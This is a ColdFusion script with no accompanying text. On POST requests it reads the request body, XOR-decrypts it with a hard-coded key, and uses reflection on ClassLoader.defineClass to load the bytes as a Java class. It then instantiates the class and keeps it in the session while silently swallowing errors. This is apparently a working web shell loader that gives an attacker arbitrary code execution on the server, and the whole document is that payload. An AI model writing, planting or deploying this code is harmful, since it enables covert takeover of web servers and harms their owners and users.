<cfif isDefined("CGI.REQUEST_METHOD") AND CGI.REQUEST_METHOD EQ "POST">
<cfscript>
    try {
        loader = structKeyExists(Session, "pulsar_loader") ? Session.pulsar_loader : "";

        if (NOT isObject(loader)) {
            pageCtx = getPageContext();
            req = pageCtx.getRequest();
            inputStream = req.getInputStream();
            
            bos = CreateObject("java", "java.io.ByteArrayOutputStream").init();
            
            reflectArray = CreateObject("java", "java.lang.reflect.Array");
            byteClass = CreateObject("java", "java.lang.Byte").TYPE;
            buf = reflectArray.newInstance(byteClass, JavaCast("int", 512));
            
            length = inputStream.read(buf);
            while (length GT 0) {
                bos.write(buf, JavaCast("int", 0), JavaCast("int", length));
                length = inputStream.read(buf);
            }
            encryptedData = bos.toByteArray();
            dataLength = reflectArray.getLength(encryptedData);

            if (dataLength GT 0) {
                keyStr = "[NBPULSARDEADBEEF]";
                Session.k = keyStr;
                rawSession = pageCtx.getRequest().getSession(true);
                rawSession.setAttribute("k", keyStr);
                keyBytes = keyStr.getBytes();
                keyLength = reflectArray.getLength(keyBytes);
                
                decryptedData = reflectArray.newInstance(byteClass, JavaCast("int", dataLength));
                
                for (i = 0; i < dataLength; i++) {
                    dataByte = reflectArray.getByte(encryptedData, JavaCast("int", i));
                    
                    keyByte = reflectArray.getByte(keyBytes, JavaCast("int", (i + 1) % keyLength));
                    
                    decryptedByte = bitXor(JavaCast("int", dataByte), JavaCast("int", keyByte));
                    reflectArray.setByte(decryptedData, JavaCast("int", i), JavaCast("byte", decryptedByte));
                }
                
                parentLoader = pageCtx.getClass().getClassLoader();
                
                urlClass = CreateObject("java", "java.lang.Class").forName("java.net.URL");
                urlArray = reflectArray.newInstance(urlClass, JavaCast("int", 0));
                
                sandboxLoader = CreateObject("java", "java.net.URLClassLoader").init(urlArray, parentLoader);
                
                classLoaderClass = CreateObject("java", "java.lang.Class").forName("java.lang.ClassLoader");
                stringClass = CreateObject("java", "java.lang.Class").forName("java.lang.String");
                
                paramTypes = [ 
                    stringClass, 
                    decryptedData.getClass(), 
                    CreateObject("java", "java.lang.Integer").TYPE, 
                    CreateObject("java", "java.lang.Integer").TYPE 
                ];
                
                defineMethod = classLoaderClass.getDeclaredMethod("defineClass", paramTypes);
                defineMethod.setAccessible(true);
                
                objectClass = CreateObject("java", "java.lang.Class").forName("java.lang.Object");
                javaArgs = reflectArray.newInstance(objectClass, JavaCast("int", 4));
                
                reflectArray.set(javaArgs, JavaCast("int", 0), JavaCast("null", ""));
                reflectArray.set(javaArgs, JavaCast("int", 1), decryptedData);
                reflectArray.set(javaArgs, JavaCast("int", 2), JavaCast("int", 0));
                reflectArray.set(javaArgs, JavaCast("int", 3), JavaCast("int", dataLength));
                
                clazz = defineMethod.invoke(sandboxLoader, javaArgs);
                
                constructorArgTypes = reflectArray.newInstance(CreateObject("java", "java.lang.Class").forName("java.lang.Class"), JavaCast("int", 1));
                reflectArray.set(constructorArgTypes, JavaCast("int", 0), classLoaderClass);
                constructor = clazz.getConstructor(constructorArgTypes);
                
                constructorArgs = reflectArray.newInstance(objectClass, JavaCast("int", 1));
                reflectArray.set(constructorArgs, JavaCast("int", 0), sandboxLoader);
                loader = constructor.newInstance(constructorArgs);
                
                Session.pulsar_loader = loader;
            } else {
                
            }
            
        } else {
            loader.equals(getPageContext());
        }
        
    } catch (any e) {
        
    }
</cfscript>
</cfif>